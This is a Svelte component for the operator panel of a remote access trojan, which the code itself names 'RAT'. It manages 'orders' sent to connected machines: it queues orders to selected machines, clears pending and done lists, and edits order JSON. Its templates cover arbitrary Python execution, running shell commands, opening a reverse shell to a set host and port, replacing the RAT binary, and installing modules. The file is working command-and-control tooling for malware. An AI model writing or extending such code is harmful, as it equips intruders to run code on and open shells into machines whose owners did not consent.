<script lang="ts">
  import { server_config, get_auth_header} from "./auth";
  import type { MachineType } from "./types/MachineType";
  import type { OrderType } from "./types/OrderType";

  let { order=$bindable(), selected_machines, machines, modules }:
  {
    order: OrderType,
    selected_machines: Record<string, boolean>,
    machines: Record<string, MachineType>
    modules: Record<string, string>
  } = $props();

  let code = $state(JSON.stringify(order.data, null, "\t"));
  let saved = $state(true);

  async function send_patch(body:any) {
    await fetch(server_config.url + "api/orders/" + order.id, 
      {
        method: "PATCH",
        headers: get_auth_header({
          "Content-Type": "application/json"
        }),
        body: JSON.stringify(body),
      }).then(response => {
          if (response.ok) return response.json();
      }).then(data => {
        if (data) order = data;
      })
  }

  async function send_to_selected(force=false) {
    for (const [machine_id, selected] of Object.entries(selected_machines)) {
      if (selected) {
        if ((force || !order.done.includes(machine_id)) && !order.pending.includes(machine_id)) {
          order.pending.push(machine_id);
        }
      }
    }
    send_patch({pending: order.pending});
  }

  async function unsend_to_selected() {
    for (const [machine_id, selected] of Object.entries(selected_machines)) {
      if (selected) {
        if (order.pending.includes(machine_id)) {
          const index = order.pending.indexOf(machine_id);
          if (index > -1) {
            order.pending.splice(index, 1);
          }
        }
      }
    }
    send_patch({pending: order.pending});
  }

  function opt_fmt(data: any) {
    return JSON.stringify(data, null, "\t");
  }
</script>

<details>
  <summary><h3>{order.name} | {order.id}</h3></summary>
  <br>
  <button title="Send to selected machines that haven't already completed this order" onclick={async() => await send_to_selected()}>Send to selected</button>
  <button title="Send to selected machines even if they already completed this order" onclick={async() => await send_to_selected(true)}>Force send to selected</button>
  <button title="Remove selected machines from pending" onclick={async() => await unsend_to_selected()}>Unsend to selected</button>
  <button onclick={async () => {
    if (confirm("Delete?")) {
      await fetch(server_config.url + "api/orders/" + order.id, {
        method: "DELETE",   
        headers: get_auth_header(),
      })
    }
  }}>Delete</button>
  <button onclick={async () => {
      send_patch({name: prompt("New name: ", order.name) ?? order.name});
    }}>Rename</button>
    <br>
    <br>

    <div class="horizontal-list">
      <b>Pending: </b>
      <button class="nogap" onclick={() => {if(confirm("Clear pending?")) send_patch({pending: []});}}>🗑️</button>
      
      {#each order.pending as machine_id}
        <span class='{selected_machines[machine_id] ? "selected " : ""}{machines[machine_id].connected ? "active" : "inactive"}'>{machine_id}</span>
      {/each}
    </div>

    <div class="horizontal-list">
      <b>Done: </b>
      <button class="nogap" onclick={() => {if(confirm("Clear done?")) send_patch({done: []});}}>🗑️</button>

      {#each order.done as machine_id}
        <span class='{selected_machines[machine_id] ? "selected " : ""}{machines[machine_id].connected ? "active" : "inactive"}'>{machine_id}</span>
      {/each}
    </div>

    <br>

    <label for="templates">Choose a template:</label>
    <select name="templates" id="templates" bind:value={code} onchange={() => {saved = false;}}>
      <option value={opt_fmt({type:"python", code:"print('Hello world')"})}>Python code</option>
      <option value={opt_fmt({type:"run", code:"gnome-calculator -m advanced"})}>Run command</option>
      <option value={opt_fmt({type:"shell", host:"127.0.0.1", port:1234})}>Reverse shell</option>
      <option value={opt_fmt({type:"update", code:"REPLACE THE RAT FILE WITH THIS (DANGEROUS!!)"})}>Update RAT</option>
      {#each Object.entries(modules) as [name, code] (name)}
        <option value={opt_fmt({type:"install_module", name:name, code: code})}>Install {name}</option>
        <option value={opt_fmt({type:"uninstall_module", name:name})}>Uninstall {name}</option>
      {/each}
    </select>
    <button onclick={async () => {
      try {
        order.data = JSON.parse(code);
        send_patch({data: order.data});
        saved = true;
      } catch (e) {
        alert(e);
      }
    }}>Save code</button>
    <br>
    <textarea placeholder="Order JSON" bind:value={code} oninput={() => {saved = false;}} class={saved ? "saved" : "unsaved"}></textarea>
</details>
<br>

<style>
  summary h3 {
    display: inline;
  }

  .horizontal-list {
    display: flex;
    flex-direction: row;
    gap: 1em;
    overflow: auto;
    padding-bottom: 1em;
  }

  .nogap {
    margin-left: -0.75em;
  }

  .selected {
    text-decoration-line: underline;
  }

  .active {
    color: lightblue;
  }

  .inactive {
    color: lightcoral;
  }

  .unsaved {
    color: darkred;
  }
</style>